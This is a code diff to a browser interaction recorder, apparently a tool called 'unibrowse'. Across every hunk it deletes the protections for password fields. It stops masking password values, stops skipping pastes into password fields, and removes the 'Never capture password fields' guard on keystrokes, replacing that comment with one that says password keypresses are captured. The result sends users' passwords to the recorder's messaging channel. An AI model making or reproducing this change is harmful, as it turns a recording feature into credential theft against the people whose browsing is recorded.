@@ -384,7 +384,6 @@ if (window.__unibrowse_recording__) {
     if (!target) return;
     const tag = target.tagName.toLowerCase();
     if (tag !== 'input' && tag !== 'textarea' && tag !== 'select') return;
-    const isPassword = target.type === 'password';
     safeSend({
       type: 'SR_INTERACTION',
       interaction: {
@@ -396,7 +395,7 @@ if (window.__unibrowse_recording__) {
         name: target.name || null,
         id: target.id || null,
         placeholder: (target.placeholder || '').slice(0, 80),
-        value: isPassword ? '[password]' : (String(target.value || '')).slice(0, 500),
+        value: String(target.value || '').slice(0, 500),
         context: captureContext(target),
       },
     });
@@ -474,7 +473,6 @@ if (window.__unibrowse_recording__) {
   document.addEventListener('paste', (e) => {
     if (!isContextValid()) return;
     const target = e.target;
-    if (target?.type === 'password') return;
     let text = '';
     try { text = (e.clipboardData || window.clipboardData)?.getData('text') || ''; } catch {}
     safeSend({
@@ -490,15 +488,12 @@ if (window.__unibrowse_recording__) {
     });
   }, true);
 
-  // Keyboard tracking — all non-password keypresses.
+  // Keyboard tracking — all keypresses including password fields.
   // In text input fields: only special keys (Enter, Escape, etc.) and modifier combos.
   // Outside inputs: all keys.
   document.addEventListener('keydown', (e) => {
     if (!isContextValid()) return;
     const target = e.target;
-
-    // Never capture password fields
-    if (target?.type === 'password') return;
 
     const isInputField = ['input', 'textarea'].includes(target?.tagName?.toLowerCase()) || target?.isContentEditable;
     const hasModifier = e.ctrlKey || e.metaKey || e.altKey;
@@ -769,7 +764,6 @@ if (window.__unibrowse_recording__) {
     if (!target) return;
     const tag = target.tagName?.toLowerCase();
     if (!['input', 'textarea', 'select', 'button', 'a'].includes(tag) && !target.isContentEditable) return;
-    if (target.type === 'password') return;
     safeSend({
       type: 'SR_INTERACTION',
       interaction: {
